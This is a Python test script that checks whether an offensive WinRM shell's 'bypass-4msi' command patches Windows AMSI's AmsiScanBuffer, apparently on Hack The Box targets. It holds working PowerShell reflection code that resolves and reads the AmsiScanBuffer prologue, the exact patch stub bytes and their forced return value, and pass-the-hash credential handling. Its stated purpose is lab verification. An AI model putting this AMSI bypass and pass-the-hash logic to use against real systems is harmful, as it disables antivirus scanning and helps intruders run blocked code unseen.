#!/usr/bin/env python3
"""Prove bypass-4msi actually patches AmsiScanBuffer.

The success message is the shell's own claim and proves nothing. This asserts on
the target's own state instead, three ways, and which apply depends on whether
anything is enforcing:

  bytes      - the 12 bytes at AmsiScanBuffer became the patch stub
  behavior  - AmsiScanBuffer's HRESULT became the stub's hardcoded value
  end-to-end - a sample AMSI blocks before the patch runs freely after

Only the last is the real thing, and it is *unassertable* where nothing is
enforcing: the sample runs freely before and after, so the check cannot fail.
That is the default on most HTB boxes -- Forest ships Defender with current
signatures and its AMSI provider registered, but real-time monitoring off. Hence
the other two, which work regardless.

Conversely, when AMSI *is* enforcing, this harness's own probes get blocked: they
contain "amsi.dll" and "AmsiScanBuffer" and read as the very bypass they measure.
So the probes are defined twice -- once up front, and again after the patch when
they are no longer blocked. The "before" readings are therefore best-effort, and
are reported as unavailable rather than counted as failures.

To make the end-to-end check assertable, as admin:
    Set-MpPreference -DisableRealtimeMonitoring $false
then reconnect, since AMSI state is read at process start.

Before/after must happen in ONE session: each WinRM session is a fresh
wsmprovhost.exe, so a patch applied in one process is invisible to the next.
Piped stdin is enough -- nothing under test needs a terminal.

The credential may be a password or a 32-hex NT hash (pass-the-hash); enabling
the provider needs admin, so the interesting run is usually PtH as Administrator.

Usage: scripts/bypass4msi-test.py <host> <user> <realm> <password|nthash>
"""
import re
import subprocess
import sys

if len(sys.argv) != 5:
    sys.exit(__doc__)
HOST, USER, REALM, PASS = sys.argv[1:5]

# The stub upstream writes: mov eax,0x80071234 / mov ax,0x32 / mov al,0x57 / ret.
# It returns 0x80070057 (E_INVALIDARG) without ever looking at its arguments.
PATCH = "b83412078066b83200b057c3"
STUB_HR = "0x80070057"

EICAR = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"
BLOCKED = "blocked by your antivirus"

# Resolves the export the way the payload does, including the HandleRef overload
# this port had to accommodate, then reads the prologue back.
GET_ADDR = (
    "function Get-Addr { Param($m,$f) "
    "$t = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { "
    "$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') "
    "}).GetType('Microsoft.Win32.UnsafeNativeMethods'); "
    "$g = @(); $t.GetMethods() | ForEach-Object { if ($_.Name -like 'Ge*P*oc*ddress') { $g += $_ } }; "
    "$h = ($t.GetMethod('GetModuleHandle')).Invoke($null, @($m)); "
    "if ($g[0].GetParameters()[0].ParameterType.Name -eq 'HandleRef') { "
    "$h = New-Object System.Runtime.InteropServices.HandleRef($null, $h) }; "
    "return $g[0].Invoke($null, @($h, $f)) }"
)
READ_AMSI = (
    "function Read-Amsi { Param($tag) $a = Get-Addr 'amsi.dll' 'AmsiScanBuffer'; "
    "$b = New-Object byte[] 12; "
    "[System.Runtime.InteropServices.Marshal]::Copy($a, $b, 0, 12); "
    "'AMSI-' + $tag + '=' + (($b | ForEach-Object { $_.ToString('x2') }) -join '') }"
)
# Guarded, so the second definition pass is a no-op when the first one worked.
AMSI_PINVOKE = (
    "if (-not ('AmsiT' -as [type])) { Add-Type -TypeDefinition "
    "'using System; using System.Runtime.InteropServices; public class AmsiT { "
    '[DllImport("amsi.dll")] public static extern int AmsiInitialize('
    "[MarshalAs(UnmanagedType.LPWStr)]string a, out IntPtr c); "
    '[DllImport("amsi.dll")] public static extern int AmsiScanBuffer(IntPtr c, byte[] b, uint l, '
    "[MarshalAs(UnmanagedType.LPWStr)]string n, IntPtr s, out int r); }' }"
)
AMSI_INIT = "$ctx=[IntPtr]::Zero; $null=[AmsiT]::AmsiInitialize('probe',[ref]$ctx)"
AMSI_SCAN = (
    "function Scan { Param($tag) $r=0; "
    f"$b=[Text.Encoding]::ASCII.GetBytes('{EICAR}'); "
    "$h=[AmsiT]::AmsiScanBuffer($script:ctx,$b,$b.Length,'probe',[IntPtr]::Zero,[ref]$r); "
    "'SCAN-' + $tag + '=0x{0:x8}' -f $h }"
)
DEFINE = [GET_ADDR, READ_AMSI, AMSI_PINVOKE, AMSI_INIT, AMSI_SCAN]

script = "\n".join(
    DEFINE
    + ["Read-Amsi BEFORE", "Scan BEFORE", f'Write-Output "{EICAR}"']
    + ["bypass-4msi"]
    # Defined again: under an enforcing AMSI the first pass was blocked, because
    # these probes look exactly like what they are measuring.
    + DEFINE
    + ["Read-Amsi AFTER", "Scan AFTER", f'Write-Output "{EICAR}"']
    # A second invocation must not re-patch: the payload removes its own helper
    # functions on the way out, so re-running would fail rather than no-op.
    + ["bypass-4msi", "exit"]
) + "\n"

CRED = ["-H", PASS] if re.fullmatch(r"[0-9a-fA-F]{32}", PASS) else ["-p", PASS]
proc = subprocess.run(
    ["./wsmancer", "-i", HOST, "-u", USER, "-r", REALM, "-n"] + CRED,
    input=script, capture_output=True, text=True, timeout=900)
out = proc.stdout + proc.stderr

results = []
def check(name, ok, detail=""):
    results.append((name, ok))
    print(f"  {'PASS' if ok else 'FAIL'}  {name}" + ("" if ok else f"\n          detail={detail}"))

def note(msg):
    print(f"  NOTE  {msg}")

def grab(pat, tag):
    m = re.search(pat.format(tag=tag), out)
    return m.group(1) if m else None

before = grab(r"AMSI-{tag}=([0-9a-f]{{24}})", "BEFORE")
after = grab(r"AMSI-{tag}=([0-9a-f]{{24}})", "AFTER")
sb = grab(r"SCAN-{tag}=(0x[0-9a-f]{{8}})", "BEFORE")
sa = grab(r"SCAN-{tag}=(0x[0-9a-f]{{8}})", "AFTER")
enforcing = BLOCKED in out

# --- must hold on any target -------------------------------------------------
check("the shell reported success", "AMSI patched in this runspace" in out, out[-400:])
check("no step reported an error", "Error: step" not in out,
      re.search(r"Error: step.*", out).group(0) if "Error: step" in out else "")
check("AmsiScanBuffer holds the patch stub afterwards", after == PATCH,
      f"after={after} want={PATCH}")
check("AmsiScanBuffer returns the stub's value afterwards", sa == STUB_HR,
      f"after={sa} want={STUB_HR}")
check("a second bypass-4msi is a no-op, not a re-patch", "already patched" in out, out[-400:])

# --- before-readings: best effort, since an enforcing AMSI blocks the probe ---
if before is None or sb is None:
    note("pre-patch probe was blocked (AMSI enforcing) - it reads as a bypass itself;")
    note("the before/after delta is covered by the end-to-end checks instead")
else:
    check("it was not already patched (so the delta means something)", before != PATCH,
          f"before={before}")
    check("AmsiScanBuffer did not already return the stub's value", sb != STUB_HR,
          f"before={sb}")

# --- the real thing, assertable only when something is enforcing --------------
head, _, tail = out.partition("patching AMSI in")
if enforcing:
    check("AMSI blocked the sample BEFORE the patch",
          BLOCKED in head and EICAR not in head, head[-400:])
    check("the obfuscated payload itself got past the ACTIVE AMSI",
          "AMSI patched in this runspace" in out, out[-500:])
    check("the sample runs AFTER the patch", EICAR in tail and BLOCKED not in tail,
          tail[-400:])
else:
    note("end-to-end block/allow SKIPPED: nothing is enforcing on this target,")
    note("so the sample runs before and after and the check cannot fail.")
    note("As admin: Set-MpPreference -DisableRealtimeMonitoring $false, then reconnect.")

print()
failed = [r for r in results if not r[1]]
print(f"== {len(results) - len(failed)}/{len(results)} passed "
      f"({'enforcing' if enforcing else 'not enforcing'}) ==")
if failed:
    print("\n--- session output ---\n" + out[-2500:])
sys.exit(1 if failed else 0)
